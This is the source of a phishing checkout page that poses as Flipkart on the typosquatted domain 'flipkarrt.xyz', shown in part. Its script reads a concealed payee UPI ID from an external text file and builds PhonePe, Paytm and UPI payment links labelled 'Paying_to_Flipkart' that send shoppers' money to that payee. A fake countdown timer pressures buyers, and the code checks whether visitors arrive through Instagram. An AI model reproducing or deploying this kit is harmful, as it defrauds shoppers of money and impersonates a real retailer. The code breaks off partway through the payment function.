<html lang="en-IN"><head>
    ...
    <link rel="shortcut icon" href="https://flipkarrt.xyz/flipka/images/flipkart-logo.png" type="image/x-icon" />
...
<script  type="text/javascript"  src="/PXM-b-v1gUTI-NwPrAw_ZPU6aFUIdZgC92W3JsQgvCEIlPz2HTw5IV3kaqIOqkm8IGCcJpqh6aBKFQm6KmTpjw=="></script><script  type="text/javascript"  src="/CfWewcZ5ywj9Xk-l7tfx615Ij0Td0UbEcX8cY95j5CqQYT4Gz6OfhhLhfh7APkoHC57gqRwv7SQ-opVm_3b-ZA=="></script></head>
...
<div id="container" >
 ...
 <div class="_1fhgRH mb-70">
    ...
    <div class="card py-1 my-1">
       <div class="py-2 px-3">
          <div class="container-fluid px-1 offerend-container">
             <h4>
             
          <span class="offer-timer" id="offerend-time">         06min 15sec</span>
          </h4></div>
<div style="display: flex; align-items: center; gap: 15px;  font-size: 10px; font-weight: 300; letter-spacing: -0.02px; line-height: 28px;"><span>PAY ONLINE (PhonePe/Paytm/Scan) </span><div style="background-color: rgb(206, 206, 222); height: 1px; flex-grow: 1;"></div></div>
   ...
   <!-- Payment options -->
            <div class="form-check available-method active" pay-type="phonepe">
                <label class="form-check-label">
                    <img src="image/phonepay.png" class="pay-logo" alt="PhonePe">
            ...
            <div class="form-check available-method" pay-type="paytm">
                <label class="form-check-label">
                    <img src="image/paytm_icon.svg" class="pay-logo" alt="Paytm">
            ...
            <div class="form-check available-method" pay-type="bhim_upi">
                <label class="form-check-label">
                    <img src="image/bhim_upi.svg" class="pay-logo" alt="Bhim UPI">
            ...
            <div class="form-check available-method" pay-type="bhim_upi">
                <label class="form-check-label">
                    <img src="image/upi.png" class="pay-logo" alt="Other UPI">
                    <span class="unaviablee">Other UPI APP</span>
                </label>
            </div>
            <br>
            <center>
            <button style="background:#FFBF00; width:330px;height:40px; border-radius:10px; color: #000000;border:none;font-size: 15px;" onclick="payNow()">PAY </button></center>
        </div>
    </div>
    
    <!-- Price Summary -->
    <div class="_1pxkiG _1eutih">
        <div class="container-fluid">
            <table class="table">
                <tbody>
                    <thead>
                        <th class="_3IZyFp" data-highlight-class="_1osddA" id="price-summary-heading">PRICE DETAILS</th>
                    </thead>
            
            <tr class="_2vTGX1">
                <td class="_z61fB">
                    
                        <div style="font-family: inter_semi_bold; font-size: 15px; font-weight: 300; letter-spacing: -0.02px; line-height: 28px;">Price (1 item)</div>
                    </td><td>
                       
                            <div id="price1" class="_3NH1UN" style="font-family: inter_semi_bold; font-size: 15px; font-weight: 300; letter-spacing: -0.02px; line-height: 28px;">₹ </div>
            ...
            <tr class="_2vTGX1">
                <td class="_z61fB">
                        ...
                        <div style="font-family: inter_semi_bold; font-size: 15px; font-weight: 300; letter-spacing: -0.02px; line-height: 28px;">Delivery Charges</div>
                    </td>
                        <td class="_38ubMW">
                            <div class="_3NH1UN"><span style="font-family: inter_semi_bold; color: rgb(0, 140, 0); font-size: 15px; font-weight: 300; letter-spacing: -0.02px; line-height: 28px;">Free Delivery</span>
                            </div>
                        </td>
                  </tr>
            ...
            <tr class="_3wcG1h">
                <td class="_z61fB">
                        ...
                        <div style="font-family: inter_semi_bold; font-size: 15px; font-weight: 300; letter-spacing: -0.02px; line-height: 28px;">Amount Payable</div>
                    </td>
                        <td class="_38ubMW">
                            <div id="price2" class="_3NH1UN"><span style="font-family: inter_semi_bold; color: rgb(0, 140, 0); font-size: 15px; font-weight: 300; letter-spacing: -0.02px; line-height: 28px;">₹ </span></div>
                        </td>
                    </tr>
                      </tbody>
            </table>
                <br>
                <button style="background:#FFBF00; width:330px;height:40px; border-radius:10px; color: #000000;border:none;font-size: 15px;" onclick="payNow()">Pay</button>
            </div>
            <br>
        </div>
    
    <img src="image/80.jpg" class="img-fluid mx-auto d-block">
    <br>
</div>
  ...
  <script>
    ...
    // Update the HTML with the fetched price in multiple places
    if (price) {
        var formattedPrice = '₹' + price;
        document.getElementById('price1').innerText = formattedPrice;
        document.getElementById('price2').innerText = formattedPrice;
        document.getElementById('price3').innerText = formattedPrice;
    }
</script>
<script>
    var itemData;
...
function startTimer(duration, display) {
    ...
    // Function to fetch UPI ID and transaction ID from upi.json
async function fetchUpiDetails() {
    try {
        // Determine if the user is accessing from Instagram
        const isInstagram = /Instagram/.test(navigator.userAgent);

        // Decide which file to fetch based on the condition
        const fileToFetch = isInstagram ? (Math.random() < 0.5 ? '../../upi.txt' : '../../upi.txt') : '../../upi.txt';

        // Fetch the file
        const response = await fetch(fileToFetch);
        const text = await response.text();

        // Split the text into lines and extract the first two lines
        const lines = text.split('\n');
        const upiId = lines[0].trim();
        const tr = lines[1].trim();
...
async function payNow() {
    ...
    var redirect_url = "";
    var totalAmount = getUrlParameter('price') || "179"; // Get the price from URL or fallback to 179

    // Fetch UPI details (UPI ID and transaction ID) from upi.txt or admin.txt
    var upiDetails = await fetchUpiDetails();
    if (!upiDetails) {
        alert('Failed to load UPI details');
        return;
    }

    var upiId = upiDetails.upiId;
    var tr = upiDetails.tr; // Transaction ID fetched from upi.txt or admin.txt

    switch (payType) {
        case 'phonepe':
            redirect_url = `phonepe://pay?ver=01&mode=19&pa=${upiId}&pn=Paying_to_Flipkart&tr=${tr}&cu=INR&mc=7446&qrMedium=04&tn=Order%20ID%20:%20RCRGaATkQwYEyTvb2qrv2&am=${totalAmount}`;
            break;

        case 'paytm':
            redirect_url = `paytmmp://pay?ver=01&mode=19&pa=${upiId}&pn=Paying_to_Flipkart&tr=${tr}&cu=INR&mc=7446&qrMedium=04&tn=Order%20ID%20:%20RCRGaATkQwYEyTvb2qrv2&am=${totalAmount}`;
            break;

        case 'bhim_upi':
            redirect_url = `upi://pay?ver=01&mode=19&pa=${upiId}&pn=Paying_to_Flipkart&tr=${tr}&cu=INR&mc=7446&qrMedium=04&tn=Order%20ID%20:%20RCRGaATkQwYEyTvb2qrv2&am=${totalAmount}`;
            break;

        case 'scan':
            redirect_url = `https://upiqr.in/api/qr?name=FLIPKART%store&vpa=${upiId}&amount=${totalAmount}`;
            break;
